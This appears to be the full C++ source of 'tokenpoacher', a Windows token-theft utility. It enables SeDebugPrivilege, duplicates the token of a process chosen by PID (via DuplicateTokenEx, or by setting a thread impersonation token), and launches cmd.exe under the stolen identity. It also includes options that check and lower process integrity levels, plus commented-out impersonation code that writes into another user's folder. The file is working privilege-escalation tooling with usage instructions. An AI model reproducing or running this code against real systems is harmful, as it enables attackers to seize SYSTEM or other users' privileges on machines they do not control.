
#include <iostream>
#include <Windows.h>
#include <string>
#include <lmcons.h>
#include <strsafe.h>
#include <sddl.h>
#include <userenv.h>
#include <Dbghelp.h>
#include <winternl.h>

#pragma comment(lib, "userenv.lib")

using namespace std;

//errorcodes: https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-
//integrity levels (good resource!): https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/bb625963(v=msdn.10)?redirectedfrom=MSDN
//get process name: https://stackoverflow.com/questions/4570174/how-to-get-the-process-name-in-c
//change integrity level: https://social.msdn.microsoft.com/Forums/en-US/4c78de2f-376c-4eb1-834b-de681f866ada/change-integrity-level-in-current-process-uiaccess?forum=vcgeneral
//more integrity level info: https://stackoverflow.com/questions/12774738/how-to-determine-the-integrity-level-of-a-process
//more integrity level info #2: https://social.msdn.microsoft.com/Forums/windowsdesktop/en-US/09ebc7f1-e3e9-4fd3-a57e-1d43b36e8f82/how-to-tell-what-processes-are-running-with-elevated-privileges?forum=windowssecurity
//SID info: https://learn.microsoft.com/en-US/windows-server/identity/ad-ds/manage/understand-security-identifiers
//lower our token integrity level example: https://kb.digital-detective.net/display/BF/Understanding+and+Working+in+Protected+Mode+Internet+Explorer


void setThreadPrivs(LPCWSTR privname)
{
    //cin.get();
    TOKEN_PRIVILEGES tp;
    LUID luid;
    HANDLE pToken;

    if (!LookupPrivilegeValue(
        NULL,            // lookup privilege on local system
        privname,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        exit(0);
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES, NULL, &pToken))
        printf("[+] opened process thread token!\n");
    else
        printf("error opening thread token: %d\n", GetLastError());

    if (!AdjustTokenPrivileges(pToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
    {
        printf("{!] AdjustTokenPrivileges error: %u\n", GetLastError());
        exit(0);
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        printf("{!] The thread token does not have this specified privilege available to the process. \n");
        exit(0);
    }
    printf("[+] Privilege: %ws added successfully  to the thread!!!\n", privname);
    CloseHandle(pToken);
   //cin.get();
}


void setProcessPrivs(LPCWSTR privname)
{
    //cin.get();
    TOKEN_PRIVILEGES tp;
    LUID luid;
    HANDLE pToken;

    if (!LookupPrivilegeValue(
        NULL,            // lookup privilege on local system
        privname,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        exit(0);
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &pToken))
        printf("[+] opened process token!\n");

    if (!AdjustTokenPrivileges(pToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
    {
        printf("{!] AdjustTokenPrivileges error: %u\n", GetLastError());
        exit(0);
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        printf("{!] The token does not have this specified privilege available to the process. \n");
        exit(0);
    }
    printf("[+] Privilege: %ws added successfully!!!\n", privname);
    CloseHandle(pToken);
    //cin.get();
}

bool MyCreateFileFunc()
{
    cout << "attempting to create a file in a directory we don't have access to...\n";
    // Open a handle to the file

    HANDLE hFile = CreateFile(
        L"C:\\users\\usethis\\NewFile.txt",     // Filename
        GENERIC_WRITE,          // Desired access
        FILE_SHARE_READ,        // Share mode
        NULL,                   // Security attributes
        CREATE_NEW,             // Creates a new file, only if it doesn't already exist
        FILE_ATTRIBUTE_NORMAL,  // Flags and attributes
        NULL);                  // Template file handle

    if (hFile == INVALID_HANDLE_VALUE)
    {
        cout << "Failed to open / create file with current access..." << " The specific error code is: " << GetLastError() << "\n";
        return false;
    }
    else
    {
        cout << "[+] Created file successfully!!!\n";
    }
    cout << "Now trying to write to the file...\n";
    string strText = "This is a file created by impersonating the 'usethis' user!"; // For C use LPSTR (char*) or LPWSTR (wchar_t*)
    DWORD bytesWritten;
    BOOL written = WriteFile(
        hFile,            // Handle to the file
        strText.c_str(),  // Buffer to write
        (DWORD)strText.size(),   // Buffer size
        &bytesWritten,    // Bytes written
        NULL);         // Overlapped

    // Close the handle once we don't need it.

    if (bytesWritten != 0)
    {
        cout << "[+] Data written to file successfully!!!\n";
        return true;
    }
    else
        return false;
    CloseHandle(hFile);
}

int CheckProcessIntegrity(DWORD pid)
{
    //enable SE_DEBUG!!!
    //setProcessPrivs(SE_DEBUG_NAME); shouldn't need this, re-enable if you need to
    //Enable SE_DEBUG routine complete

    HANDLE hProc;
    hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc)
    {
        printf("there was a permissions error opening the process w/ all access...: %d\n", GetLastError());
    }
    std::string procname;
    DWORD buffSize = 1024;
    CHAR buffer[1024];
    if (QueryFullProcessImageNameA(hProc, 0, buffer, &buffSize))
    {
        procname = buffer;
        std::cout << "processname: " << procname;
        std::cout << "\n";
    }

    HANDLE hTok;
    if (!OpenProcessToken(hProc, TOKEN_QUERY, &hTok))
    {
        printf("there was an a permissions error applying all access to the token: %d\n", GetLastError());
    }
    DWORD lengthneeded;
    DWORD dwIntegrityLevel;
    PTOKEN_MANDATORY_LABEL pTIL = NULL;
    GetTokenInformation(hTok, TokenIntegrityLevel, NULL, 0, &lengthneeded);
    pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, lengthneeded);
    GetTokenInformation(hTok, TokenIntegrityLevel, pTIL, lengthneeded, &lengthneeded);
    dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));
    printf("Integrity Level: %x\n", dwIntegrityLevel);
    if (dwIntegrityLevel == 0)
    {
        printf("0x0000 | Untrusted level | SECURITY_MANDATORY_UNTRUSTED_RID\n");
    }
    if (dwIntegrityLevel == 0x1000)
    {
        printf("0x1000 | Low integrity level | SECURITY_MANDATORY_LOW_RID\n");
    }
    if (dwIntegrityLevel == 0x2000)
    {
        printf("0x2000 | Medium integrity level | SECURITY_MANDATORY_MEDIUM_RID\n");
    }
    if (dwIntegrityLevel == 0x2010)
    {
        printf("0x2010 | Medium+ integrity level | SECURITY_MANDATORY_MEDIUM_PLUS_RID\n");
    }
    if (dwIntegrityLevel == 0x3000)
    {
        printf("0x3000 | High integrity level | SECURITY_MANDATORY_HIGH_RID\n");
    }
    if (dwIntegrityLevel == 0x4000)
    {
        printf("0x4000 | System integrity level | SECURITY_MANDATORY_SYSTEM_RID\n");
    }
    CloseHandle(hProc);
    CloseHandle(hTok);
    return dwIntegrityLevel;
}

int LowerProcessIntegrity(DWORD pid, int integritylevel)
{
    //enable SE_DEBUG!!!
    //setProcessPrivs(SE_DEBUG_NAME); shouldn't need this, re-enable if you need to
    //Enable SE_DEBUG routine complete

    BOOL bRet;
    HANDLE hToken;
    HANDLE hNewToken;
    //DWORD pid = pid;
    HANDLE hProc;


    WCHAR wszProcessName[MAX_PATH] =
        L"C:\\Windows\\System32\\cmd.exe";
    WCHAR wszIntegritySid[20];

    if (integritylevel == 0)
    {
        printf("The integrity level is already at the 'Untrusted Level'.  Can't drop it any further.\n");
        exit(0);
    }
    if (integritylevel == 0x1000)
    {
        printf("The integrity level is already set to 'Mandatory Label\\Low Mandatory Level'.  not worth going lower...\n");
        exit(0);
    }
    if (integritylevel == 0x2000)
    {
        printf("Integrity Level at 'Medium'.  Dropping to 'Low'\n");
        wcscpy_s(wszIntegritySid, L"S-1-16-4096");
    }
    if (integritylevel == 0x3000)
    {
        printf("Integrity Level at 'High'.  Dropping to 'Medium'\n");
        wcscpy_s(wszIntegritySid, L"S-1-16-8192");
    }
    if (integritylevel == 0x4000)
    {
        printf("Integrity Level at 'System'.  Dropping to 'High'\n");
        wcscpy_s(wszIntegritySid, L"S-1-16-12288");
    }

    PSID pIntegritySid = NULL;

    TOKEN_MANDATORY_LABEL TIL = { 0 };
    PROCESS_INFORMATION ProcInfo = { 0 };
    STARTUPINFO StartupInfo = { 0 };
    ULONG ExitCode = 0;
    DWORD dwCreationFlags = 0;
    LPWSTR pwszCurrentDirectory = NULL;
    LPVOID lpEnvironment = NULL;

    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc)
    {
        printf("There was a permissions error opening the process w/ all access...: %d\n", GetLastError());
    }
    if (!OpenProcessToken(hProc, TOKEN_ALL_ACCESS, &hToken))
    {
        printf("There was a permissions error applying all access to the token: %d\n", GetLastError());
    }
    if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken))
    {
        if (ConvertStringSidToSid(wszIntegritySid, &pIntegritySid))
        {
            TIL.Label.Attributes = SE_GROUP_INTEGRITY;
            TIL.Label.Sid = pIntegritySid;

            // Set the process integrity level
            if (SetTokenInformation(hNewToken, TokenIntegrityLevel, &TIL,
                sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(pIntegritySid)))
            {
                dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;


                if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
                {
                    wprintf(L"setting pwszCurrentDirectory failed. Error: %d\n", GetLastError());
                }
                if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
                {
                    wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
                }

                if (!CreateEnvironmentBlock(&lpEnvironment, hNewToken, FALSE))
                {
                    wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
                }
                // Create the new process at Low integrity trying both methods
                ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
                StartupInfo.cb = sizeof(STARTUPINFO);
                StartupInfo.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");

                bRet = CreateProcessAsUser(hNewToken, NULL, wszProcessName, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &StartupInfo, &ProcInfo);
                if (bRet == 0)
                {
                    printf("[!] CreateProcessAsUser didn't cooperate...trying CreateProcesswithTokenW instead\n");
                    printf("Return value: %d\n", GetLastError());
                }
                else
                {
                    printf("[+] CreateProcessAsUser worked!!!\n");
                    printf("Return value: %d\n", bRet);
                    fflush(stdout);
                    WaitForSingleObject(ProcInfo.hProcess, INFINITE);
                    //exit(0);
                }


                bRet = CreateProcessWithTokenW(hNewToken, NULL, NULL, wszProcessName, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &StartupInfo, &ProcInfo);
                if (bRet == 0)
                {
                    printf("[!] CreateProcessWithTokenW didn't cooperate...hmmm not sure what's up there. Please review the Error code\n");
                    printf("Return value: %d\n", GetLastError());
                }
                else
                {
                    printf("[+] CreateProcessAsUser worked!!!\n");
                    printf("Return value: %d\n", bRet);
                    fflush(stdout);
                    WaitForSingleObject(ProcInfo.hProcess, INFINITE);

                }
            }

            LocalFree(pIntegritySid);
            CloseHandle(hProc);
        }
        CloseHandle(hNewToken);
    }
    CloseHandle(hToken);
    return 0;
}


int DupThreadToken(DWORD pid)
{
    setProcessPrivs(SE_DEBUG_NAME);

    BOOL bRet;

    HANDLE hNewToken;
    //HANDLE proc2;
    HANDLE tok2;
    //DWORD pid = pid;
    DWORD dwCreationFlags = 0;
    LPWSTR pwszCurrentDirectory = NULL;
    LPVOID lpEnvironment = NULL;

    WCHAR wszProcessName[MAX_PATH] = L"C:\\windows\\system32\\cmd.exe";
    //WCHAR wszProcessName[MAX_PATH] = L"C:\\users\\public\\node.exe c:\\users\\public\\testcopy2.js";

    TOKEN_MANDATORY_LABEL TIL = { 0 };
    PROCESS_INFORMATION ProcInfo = { 0 };
    STARTUPINFO StartupInfo = { 0 };
    ULONG ExitCode = 0;
    HANDLE remoteproc;
    HANDLE hSystemToken;
    HANDLE hSystemTokenDup;

    // ImpersonateSelf(SecurityImpersonation);
    remoteproc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, TRUE, pid);
    if (remoteproc)
    {
        wprintf(L"Opened remote process!\n");
    }
    else
    {
        wprintf(L"OpenProcess(). Error: %d\n", GetLastError());
    }
    if (!OpenProcessToken(remoteproc, TOKEN_IMPERSONATE | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &tok2))
    {
        wprintf(L"OpenProcessToken(). Error: %d\n", GetLastError());
    }


    if (!DuplicateToken(tok2, SecurityImpersonation, &hNewToken))
    {
        wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
    }
    if (SetThreadToken(NULL, hNewToken))
    {
        printf("[!] set the thread token!\n");
    }


    setThreadPrivs(SE_INCREASE_QUOTA_NAME);     //need this for CreateProcessAsUser!
    setThreadPrivs(SE_ASSIGNPRIMARYTOKEN_NAME); //need this for CreateProcessAsUser!

    printf("thread privs set!\n");

    if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
    {
        wprintf(L"OpenThreadToken(). Error: %d\n", GetLastError());
    }

    if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
    {
        wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
    }


    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;

    if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
    {
        wprintf(L"setting pwszCurrentDirectory failed. Error: %d\n", GetLastError());
    }
    if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
    {
        wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
    }

    if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
    {
        wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
    }
    ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
    StartupInfo.cb = sizeof(STARTUPINFO);
    StartupInfo.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");
    // Create the new process w/ CreateProcessAsUser to keep within same console
    //cin.get();
    bRet = CreateProcessAsUser(hSystemTokenDup, NULL, wszProcessName, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &StartupInfo, &ProcInfo);

    if (bRet == 0)
    {
        printf("[!] CreateProcessAsUser didn't cooperate...\n");
        printf("Return value: %d\n", GetLastError());
    }
    else
    {
        printf("[+] CreateProcessAsUser worked!!!\n");
        printf("Return value: %d\n", bRet);
        fflush(stdout);
        WaitForSingleObject(ProcInfo.hProcess, INFINITE);

    }
    //fflush(stdout);
    //WaitForSingleObject(ProcInfo.hProcess, INFINITE);

    //CloseHandle(currentToken);

    /*
    bRet = CreateProcessWithTokenW(hSystemTokenDup, NULL, NULL, wszProcessName, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &StartupInfo, &ProcInfo);

    if (bRet == 0)
    {
        printf("[!] CreateProcessWithToken didn't cooperate...permissions maybe???\n");
        printf("Return value: %d\n", GetLastError());
    }
    else
    {
        printf("[+] CreateProcessWithToken worked!!!\n");
        printf("Return value: %d\n", bRet);
        fflush(stdout);
        WaitForSingleObject(ProcInfo.hProcess, INFINITE);
    }
    */
    //fflush(stdout);
    //WaitForSingleObject(ProcInfo.hProcess, INFINITE);
    CloseHandle(hSystemToken);
    CloseHandle(tok2);
    CloseHandle(remoteproc);
    CloseHandle(hNewToken);
    CloseHandle(hSystemTokenDup);
    return 0;

}

int DupProcessToken(DWORD pid)
{
    //enable ALL necessary privs!!!
    setProcessPrivs(SE_DEBUG_NAME);
    //priv enable routine complete
    BOOL bRet;

    HANDLE hNewToken;
    HANDLE proc2;
    HANDLE tok2;
    //DWORD pid = pid;
    DWORD dwCreationFlags = 0;
    LPWSTR pwszCurrentDirectory = NULL;
    LPVOID lpEnvironment = NULL;

    WCHAR wszProcessName[MAX_PATH] = L"C:\\windows\\system32\\cmd.exe";
    //WCHAR wszProcessName[MAX_PATH] = L"C:\\users\\public\\node.exe c:\\users\\public\\testcopy2.js";

    TOKEN_MANDATORY_LABEL TIL = { 0 };
    PROCESS_INFORMATION ProcInfo = { 0 };
    STARTUPINFO StartupInfo = { 0 };
    ULONG ExitCode = 0;

    proc2 = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!proc2)
    {
        printf("There was a permissions error opening process: %d w/ requested access...: %d\n", pid, GetLastError());
        exit(0);
    }

    if (!OpenProcessToken(proc2, MAXIMUM_ALLOWED, &tok2))
    {
        printf("There was a permissions error applying the requested access to the token: %d\n", GetLastError());
        exit(0);
    }
    // TCHAR name[UNLEN + 1];
    // DWORD size = UNLEN + 1;
    // GetUserName((TCHAR*)name, &size);

     //bool writestatus = MyCreateFileFunc();
     //printf("Boolean return value: %s\n", writestatus ? "true" : "false");

     /*
     * !!!Experimental!!!
     cout << "Attempting to impersonate user in context of PID: " << pid << "\n";

     BOOL impersonator=ImpersonateLoggedOnUser(tok2);
     if (impersonator)
     {
         //WinExec("py",1);
         TCHAR name[UNLEN + 1];
         DWORD size = UNLEN + 1;
         GetUserName((TCHAR*)name, &size);
         wcout << L"[+] Impersonation Success!  You are now: " << name << "!\n";

         bool writestatus = MyCreateFileFunc(); //Attempt to write a file to another user's directory we wouldn't normally have access to
         printf("Boolean return value: %s\n", writestatus ? "true" : "false");


        RevertToSelf();
     }
     else
     {
         printf("There was an issue impersonating the user...error code: %d\n", GetLastError());
     }
     */

    if (!DuplicateTokenEx(tok2, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToken))
    {
        wprintf(L"[!] DuplicateTokenEx failed. Error: %d\n", GetLastError());
    }
    else
    {
        printf("[+] DuplicateTokenEx success!!!\n");
    }
    dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;


    if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
    {
        wprintf(L"setting pwszCurrentDirectory failed. Error: %d\n", GetLastError());
    }
    if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
    {
        wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
    }

    if (!CreateEnvironmentBlock(&lpEnvironment, hNewToken, FALSE))
    {
        wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
    }
    ZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
    StartupInfo.cb = sizeof(STARTUPINFO);
    StartupInfo.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");
    // Create the new process using CreateProcessWithTokenW in a new, separate console
    // to the reader: use -dt for duplicatethread token for shell within same console

/*
        bRet = CreateProcessAsUser(hNewToken, NULL, wszProcessName, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &StartupInfo, &ProcInfo);

        if (bRet == 0)
        {
            printf("[!] CreateProcessAsUser didn't cooperate...going to try CreateProcessWithToken method\n");
            printf("Return value: %d\n", GetLastError());
        }
        else
        {
            printf("[+] CreateProcessAsUser worked!!!\n");
            printf("Return value: %d\n", bRet);
            fflush(stdout);
            WaitForSingleObject(ProcInfo.hProcess, INFINITE);
            exit(0);
        }
*/
    bRet = CreateProcessWithTokenW(hNewToken, NULL, NULL, wszProcessName, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &StartupInfo, &ProcInfo);

    if (bRet == 0)
    {
        printf("[!] CreateProcessWithToken didn't cooperate...permissions maybe???\n");
        printf("Return value: %d\n", GetLastError());
    }
    else
    {
        printf("[+] CreateProcessWithToken worked!!!\n");
        printf("Return value: %d\n", bRet);
        fflush(stdout);
        WaitForSingleObject(ProcInfo.hProcess, INFINITE);
    }
    CloseHandle(hNewToken);
    CloseHandle(proc2);
    CloseHandle(tok2);
    return 0;

}


int main(int argc, char* argv[])
{
    //printf("argc: %d", argc);
    DWORD pid;
    if (argc == 1 || argc < 4 && strcmp(argv[1], "-lcp") != 0)
    {
        printf("Options:\n -p 'process id'\n -cpi 'check process integrity'\n -d 'Technique: duplicate process token (spawns separate shell)'\n -dt 'Technique: duplicate process thread impersonation token and convert to primary token (spawns shell within current console!)'\n -lcp '(!!!Experimental!!!) lower current process integrity by 1 (spawns shellz)'\n -l '(!!!Experimental!!!) lower another program's process integrity by 1 (spawns shellz)'\n");
        printf("usage: tokenpoacher.exe -p 1234 -cpi\n");
        printf("usage: tokenpoacher.exe -p 1234 -d\n");
        printf("usage: tokenpoacher.exe -p 1234 -dt\n");
        printf("usage: tokenpoacher.exe -lcp\n");
        printf("usage: tokenpoacher.exe -p 1234 -l\n");


        //printf("usage: processpoacher.exe -p 1234 -dp\n");
        exit(0);
    }
    /*
    printf("argc count: %d\n", argc);
    for (int a = 0; a < argc; a++)
    {
        printf("arg %d: %s\n", a, argv[a]);
    }
    */
    if (strcmp(argv[1], "-p") == 0)
    {
        if (strcmp(argv[3], "-l") == 0)
        {
            pid = atoi(argv[2]);
            int level = CheckProcessIntegrity(pid);
            LowerProcessIntegrity(GetCurrentProcessId(), level);
            exit(0);
        }

    }
    if (strcmp(argv[1], "-lcp") == 0)
    {
        int level = CheckProcessIntegrity(GetCurrentProcessId());
        LowerProcessIntegrity(GetCurrentProcessId(), level);
        exit(0);
    }

    if (strcmp(argv[1], "-p") == 0)
    {
        if (strcmp(argv[3], "-d") == 0)
        {
            pid = atoi(argv[2]);
            //DupToken method(pid);
            DupProcessToken(pid);
            exit(0);
        }
        if (strcmp(argv[3], "-dt") == 0)
        {
            pid = atoi(argv[2]);
            //CheckProcessIntegrity(pid);
            DupThreadToken(pid);
            exit(0);
        }

    }
    if (strcmp(argv[1], "-p") == 0)
    {
        if (strcmp(argv[3], "-cpi") == 0)
        {
            pid = atoi(argv[2]);
            CheckProcessIntegrity(pid);
            exit(0);
        }

    }

    printf("hmm...I don't understand that parameter option");

}



